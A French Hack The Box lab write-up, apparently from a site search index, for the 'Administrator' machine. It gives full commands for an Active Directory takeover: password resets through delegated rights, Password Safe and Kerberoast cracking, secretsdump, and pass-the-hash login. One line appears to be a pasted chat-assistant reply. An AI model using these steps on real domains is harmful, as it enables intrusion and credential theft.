3:1:1: |_ Message signing enabled and required |_clock-skew: 7h00m01s Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Wed Apr 2 03:59:28 2025 -- 1 IP address (1 host up) scanned in 18.16 seconds Explication : -sC : lance les scripts par d\u00e9faut (comme un petit scan de vuln\u00e9rabilit\u00e9s). -sV : d\u00e9tecte les versions des services. -oN nmap.txt : enregistre les r\u00e9sultats dans un fichier texte. 10.10.11.42 : IP de la machine (\u00e0 adapter selon ton instance HTB). R\u00e9sultat : Port Service Description 21 FTP Microsoft ftpd \u2013 souvent mal configur\u00e9 88 Kerberos Utilis\u00e9 pour l\u2019authentification AD 135 MSRPC Appels de proc\u00e9dure \u00e0 distance 139, 445 SMB Partages de fichiers \u2013 potentiellement juteux 389, 3268 LDAP Infos sur les utilisateurs/domaine via AD 5985 WinRM Interface d\u2019administration distante HTTP (PowerShell Remoting)","title":"Commande :"},{"location":"Hack%20The%20Box/Administrator/#olivia","text":"On commence la box avec un petit cadeau du cr\u00e9ateur : les creds olivia : ichliebedich . Classique. Premier r\u00e9flexe : je tente un acc\u00e8s FTP vu qu\u2019il y a un port 21 qui tra\u00eene. Mais nop, c\u2019est mort direct : ftp 10.10.11.42 > login failed, home directory inaccessible Bon, pas grave. Je bascule sur le SMB et l\u00e0\u2026 bingo : crackmapexec smb 10.10.11.42 -u 'olivia' -p 'ichliebedich' --shares Et l\u00e0 je vois que les identifiants passent Mais pas de share super utile dispo (juste ADMIN$, IPC$, NETLOGON, SYSVOL\u2026). Rien \u00e0 loot pour l\u2019instant. Du coup je tente WinRM\u2026 et l\u00e0 : crackmapexec winrm 10.10.11.42 -u 'olivia' -p 'ichliebedich' Connexion directe avec Evil-WinRM : evil-winrm -i 10.10.11.42 -u 'olivia' -p 'ichliebedich' Une fois dans la session, je check rapidement les privil\u00e8ges : whoami /all \u2192 User basique, pas d\u2019acc\u00e8s admin mais quelques droits comme SeMachineAccountPrivilege . Rien de fou, mais je prends. Je liste aussi les users pr\u00e9sents sur la machine : net user Et l\u00e0 je vois pas mal de comptes int\u00e9ressants : administrator , alexander , benjamin , emily , ethan , michael , etc. Y\u2019a du monde sur ce domaine. Clairement un bon terrain pour lancer BloodHound et rep\u00e9rer une escalade possible","title":"\ud83d\udd10 Olivia"},{"location":"Hack%20The%20Box/Administrator/#prise-de-controle-de-michael","text":"","title":"\ud83c\udfaf Prise de contr\u00f4le de Michael"},{"location":"Hack%20The%20Box/Administrator/#phase-bloodhound","text":"\u00c0 ce stade, j\u2019suis connect\u00e9 avec Olivia, j\u2019ai pas de droits de fou, mais y\u2019a moyen de gratter. Je d\u00e9cide donc de sortir : BloodHound Je balance bloodhound.py pour collecter tout ce que je peux sur le domaine : bloodhound.py -d administrator.htb -ns 10.10.11.42 -u olivia -p ichliebedich -c All --zip Y\u2019a une erreur sur le ticket Kerberos, mais on s\u2019en fou, il repasse en NTLM derri\u00e8re. L\u2019important c\u2019est que la collecte passe nickel. \u00c0 la fin, \u00e7a me pond un .zip que j\u2019importe dans l\u2019interface BloodHound (via Neo4j, comme d\u2019hab).","title":"\ud83e\udde0 Phase BloodHound"},{"location":"Hack%20The%20Box/Administrator/#analyse-dans-bloodhound","text":"Je check le node olivia , et l\u00e0 je vois un FDOC (First Degree Object Control) sur l\u2019utilisateur michael . Et plus pr\u00e9cis\u00e9ment, j\u2019ai un droit GenericAll sur lui.","title":"\ud83d\udd0d Analyse dans BloodHound"},{"location":"Hack%20The%20Box/Administrator/#changement-de-mot-de-passe","text":"Du coup, je reste dans ma session WinRM avec Olivia et je tape direct : net user michael michael /domain Yes sir Le mot de passe de michael est maintenant... michael . (Ouais j\u2019ai pas fait dans l\u2019originalit\u00e9, mais \u00e7a marche.)","title":"\ud83d\udd04 Changement de mot de passe"},{"location":"Hack%20The%20Box/Administrator/#verification","text":"Je teste le tout avec crackmapexec pour voir si les identifiants passent : crackmapexec smb 10.10.11.42 -u 'michael' -p 'michael' Et l\u00e0, le feu vert : [+] administrator.htb\\michael:michael Je viens officiellement de r\u00e9cup\u00e9rer un nouveau user. \ud83c\udfc6 Next stop \u2192 benjamin \ud83d\ude80 Parfait, voici la suite de ton write-up, toujours dans ton style familier et clair comme de l\u2019eau de roche \ud83d\ude0e\ud83d\udc47","title":"\u2705 V\u00e9rification"},{"location":"Hack%20The%20Box/Administrator/#prise-de-controle-de-benjamin","text":"Comme j\u2019ai encore BloodHound sous les yeux, je check le node de michael , histoire de voir s\u2019il peut m\u2019ouvrir d\u2019autres portes. Et boum : il a un FDOC sur benjamin avec le droit ForceChangePassword . \ud83e\udde0 Petit rappel : ForceChangePassword = je peux modifier le mot de passe d\u2019un user sans m\u00eame avoir besoin de l\u2019ancien . Ultra pratique.","title":"\ud83d\udd10 Prise de contr\u00f4le de Benjamin"},{"location":"Hack%20The%20Box/Administrator/#reset-du-mot-de-passe-via-rpcclient","text":"J\u2019ai pas besoin de shell pour \u00e7a. Je passe direct par rpcclient : rpcclient -U michael 10.10.11.42 Une fois dedans, je balance : setuserinfo2 benjamin 23 'benjamin' \ud83e\udde0 Ici, 23 correspond au niveau de s\u00e9curit\u00e9 de l\u2019op\u00e9ration (set password). C\u2019est une vieille astuce avec rpcclient pour modifier un mot de passe d\u2019un user sans shell, juste via RPC. Je sors de rpcclient , et je teste les creds fra\u00eechement cr\u00e9\u00e9s : crackmapexec smb 10.10.11.42 -u 'benjamin' -p 'benjamin' Et l\u00e0, encore une fois, \u00e7a passe : [+] administrator.htb\\benjamin:benjamin \ud83d\udd13 Un compte de plus dans la poche !","title":"\ud83d\udd01 Reset du mot de passe via rpcclient"},{"location":"Hack%20The%20Box/Administrator/#ftp-avec-benjamin-objectif-emily","text":"Bon, je check vite fait sur BloodHound si benjamin a des droits int\u00e9ressants. Mais nada, il est tout claqu\u00e9. Par contre, je remarque qu\u2019il est membre du groupe Share Moderators , donc je tente sa connexion sur le FTP . ftp 10.10.11.42 Je tape les creds : benjamin / benjamin Et c'est carr\u00e9 je suis logg\u00e9 ! Je liste les fichiers : ftp> dir Et je vois un fichier qui attire direct mon attention : Backup.psafe3 Un fichier .psafe3 , donc un fichier Password Safe v3 \u2026 Y\u2019a des chances qu\u2019il contienne des creds. Je le t\u00e9l\u00e9charge : ftp 10.10.11.42 Connected to 10.10.11.42. 220 Microsoft FTP Service Name (10.10.11.42:kali): benjamin 331 Password required Password: 230 User logged in. Remote system type is Windows_NT. ftp> dir 229 Entering Extended Passive Mode (|||54017|) 125 Data connection already open; Transfer starting. 10-05-24 09:13AM 952 Backup.psafe3 226 Transfer complete. ftp> get Backup.psafe3 local: Backup.psafe3 remote: Backup.psafe3 229 Entering Extended Passive Mode (|||57645|) 125 Data connection already open; Transfer starting. 100% |*************************************************************************************************************************************************| 952 10.09 KiB/s 00:00 ETA 226 Transfer complete. WARNING! 3 bare linefeeds received in ASCII mode. File may not have transferred correctly. 952 bytes received in 00:00 (6.76 KiB/s)","title":"\ud83d\udcc1 FTP avec Benjamin \u2013 Objectif : Emily"},{"location":"Hack%20The%20Box/Administrator/#recup-de-emily-via-backuppsafe3","text":"Je sais que c\u2019est un fichier Password Safe v3 , et \u00e7a veut souvent dire : y\u2019a des creds planqu\u00e9s dedans (en vrai je connaissais pas j'ai du chercher). Je tente un petit bruteforce avec hashcat (mode 5200) et le classique rockyou.txt : hashcat -m 5200 Backup.psafe3 /usr/share/wordlists/rockyou.txt Et l\u00e0 : Backup.psafe3:tekieromucho \u00c7a sent la vibe romantique ce mot de passe mdrrrr (J'ai leak parce que trop drole)","title":"\ud83e\udde0 R\u00e9cup de Emily via Backup.psafe3"},{"location":"Hack%20The%20Box/Administrator/#bloodhound-objectif-ethan","text":"Je relance un petit tour dans BloodHound avec ce que j\u2019ai r\u00e9cup\u00e9r\u00e9. Et l\u00e0 je vois qu\u2019 Emily (dont on vient de r\u00e9cup\u00e9rer les creds gr\u00e2ce au fichier) a un GenericWrite sur l\u2019utilisateur ethan . \ud83e\udde0 Pour rappel : GenericWrite = je peux modifier les attributs du compte (genre, son SPN) \u2192 parfait pour un Kerberoasting .","title":"\ud83d\udcca BloodHound : Objectif Ethan"},{"location":"Hack%20The%20Box/Administrator/#sync-de-lheure-kerberos-oblige","text":"Avant toute chose, il faut sync sa machine avec l\u2019heure du DC, sinon Kerberos nous claque la porte au nez (Je parle d'experience j'me suis manger un Clock Skew ) : sudo ntpdate -u 10.10.11.42","title":"\ud83d\udd70\ufe0f Sync de l\u2019heure (Kerberos oblige)"},{"location":"Hack%20The%20Box/Administrator/#kerberoast-ethan","text":"Je balance un targeted kerberoast avec le user emily et son mot de passe ( tekieromucho ou ce qui en sort du fichier pwsafe d\u00e9crypt\u00e9) : python3 targetedKerberoast.py -d administrator.htb --dc-ip 10.10.11.42 -u emily -p 'UXLCI5iETUsIBoFVTj8y*****' Et l\u00e0 je r\u00e9cup\u00e8re un beau gros hash bien juteux Je le crack avec hashcat (mode 13100) : hashcat -m 13100 ethan.hash /usr/share/wordlists/rockyou.txt Et... limpb..... en mot de passe. OK.","title":"\ud83d\udd25 Kerberoast Ethan"},{"location":"Hack%20The%20Box/Administrator/#dump-total-avec-secretsdumppy","text":"Je tente direct la totale avec secretsdump.py : python3 secretsdump.py administrator.htb/ethan:limpb****@10.10.11.42 \ud83e\udde0 Gr\u00e2ce \u00e0 ce compte, j\u2019ai acc\u00e8s \u00e0 la r\u00e9plication AD (via DRSUAPI), ce qui me permet de r\u00e9cup\u00e9rer tous les secrets du domaine , y compris les hash NTLM de tous les comptes \u2014 m\u00eame celui d\u2019Administrator . Et l\u00e0... C\u2019est No\u00ebl \ud83c\udf81 Je r\u00e9cup\u00e8re le hash NTLM de Administrator : Administrator:500:...:3dc553ce4b9fd20bd016e098******:::","title":"\ud83e\uddea Dump total avec secretsdump.py"},{"location":"Hack%20The%20Box/Administrator/#prise-de-controle-finale-administrator","text":"Je peux maintenant me connecter avec Evil-WinRM : evil-winrm -i 10.10.11.42 -u Administrator -H 3dc553ce4b9fd20bd016e098****** Shell Admin. Et la, c'est la fin Et pour les puristes, je sors aussi l\u2019artillerie old school : psexec.py administrator.htb/Administrator@10.10.11.42 -hashes :3dc553ce4b9fd20bd016e098****** \u2192 SYSTEM, baby.","title":"\ud83c\udfc1 Prise de contr\u00f4le finale \u2013 Administrator"},{"location":"Hack%20The%20Box/Administrator/#resume-des-users-creds","text":"Utilisateur Acc\u00e8s / Mot de passe Comment ? olivia ichliebedich fourni au d\u00e9but michael michael reset via GenericAll (BloodHound) benjamin benjamin ForceChangePassword via michael emily UXLCI5... / depuis .psafe3 fichier FTP crack\u00e9 ethan limpb**** Kerberoasting depuis Emily Administrator hash NTLM secretsdump avec ethan","title":"\ud83e\udde9 R\u00e9sum\u00e9 des users / creds"}]}